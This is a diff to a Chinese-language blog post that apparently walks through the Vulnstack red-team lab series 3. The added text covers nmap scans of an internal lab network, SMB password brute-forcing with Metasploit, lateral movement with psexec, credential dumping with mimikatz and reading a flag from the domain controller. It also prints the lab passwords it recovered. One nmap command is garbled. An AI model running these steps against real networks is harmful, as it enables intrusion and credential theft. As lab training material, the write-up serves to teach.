@@ -651,12 +651,45 @@ set rhosts 192.168.93.1-255
 set threads 20
 run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>这里扫描完之后可以发现，内网里有1台主机存活，分别是192.168.93.10 （这里我只开了域控主机）</p>
-<p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328120802078.png"></p>
+<p>这里扫描完之后可以发现，内网里有3台主机存活，分别是192.168.93.10 192.168.93.20 192.168.93.30 </p>
+<p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328134835889.png"></p>
 <p>但是这时候信息还不够，调用nmap继续扫描详细信息</p>
-<pre class="line-numbers language-none"><code class="language-none">proxychains nmap -T4 -sC -sV 192.168.93.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">nmap -T4 -sC -sV 192.168.93.10192.168.93.10 192.168.93.20 192.168.93.30 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>首先是10这台主机，可以看到开放了88跟389这两个端口，熟悉的师傅都应该知道这两个端口大概率锁定了这台主机就是域控</p>
+<p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20220328135435705.png"></p>
+<p>20这台主机开的都是几个常规端口，值得注意的就是1433端口，意味着20这台主机上有mssql服务</p>
+<p>30这台主机也是开了几个常规端口，跟前面两台主机相比就没什么特征端口，应该是一个普通的域成员主机</p>
+<h4 id="4-2-永恒之蓝漏洞利用"><a href="#4-2-永恒之蓝漏洞利用" class="headerlink" title="4.2 永恒之蓝漏洞利用"></a>4.2 永恒之蓝漏洞利用</h4><p>这里我发现三台主机都开了139、445端口，那么先使用永恒之蓝模块先批量扫描一波看有没有可以直接用永恒之蓝打下来的主机</p>
+<p>这里没有能够直接用永恒之蓝拿下的主机，win7跟2008匿名管道都没有开所以利用不了</p>
+<p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20210708160657115.png"></p>
+<h4 id="4-3-密码枚举"><a href="#4-3-密码枚举" class="headerlink" title="4.3 密码枚举"></a>4.3 密码枚举</h4><p>因为这三台主机都开了445端口，可以使用smb，使用msf中的<code>smb_login</code>模块进行密码枚举尝试</p>
+<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_login
+set rhosts 192.168.93.20
+set SMBUser Administrator
+set PASS_FILE &#x2F;tmp&#x2F;1W.txt
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里很幸运，跑出来的密码是<code>123qwe!ASD</code>刚好在我的<code>1W.txt</code>这个字典里面</p>
+<p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20210704151612269.png"></p>
+<h4 id="4-4-psexec横向移动"><a href="#4-4-psexec横向移动" class="headerlink" title="4.4 psexec横向移动"></a>4.4 psexec横向移动</h4><p>这里使用proxifier将msf的socks代理到本地，忘记截图了orz…</p>
+<p>这里既然已经拿到了administrator的密码，使用ipc先连接到20这一台主机，使用copy命令将mimikatz拷贝到20这台主机上</p>
+<p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20210704155242601.png"></p>
+<p>然后使用psexec获取一个cmd环境，使用mimikatz抓取hash并保存为日志</p>
+<pre class="line-numbers language-none"><code class="language-none">psexec64.exe \\192.168.93.20 cmd
+
+mimiKatz.exe log privilege::debug sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20210704155916269.png"></p>
+<p>type mimikatz.log<code>读取日志内容可以发现域管的帐号密码为</code>Administrator zxcASDqw123!!</p>
+<p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20210708161335659.png"></p>
+<p>那么这里也直接使用ipc连接直接连接10这台主机，即TEST这个域的域控，可以看到已经连接成功了</p>
+<p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20210704160617532.png"></p>
+<p>使用命令查看机密文件</p>
+<pre class="line-numbers language-none"><code class="language-none">dir \\192.168.93.10\C$\users\Administrator\Documents
+type \\192.168.93.10\C$\users\Administrator\Documents\flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2021/10/30/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%89/image-20210704160724866.png"></p>
 
                 
             </div>
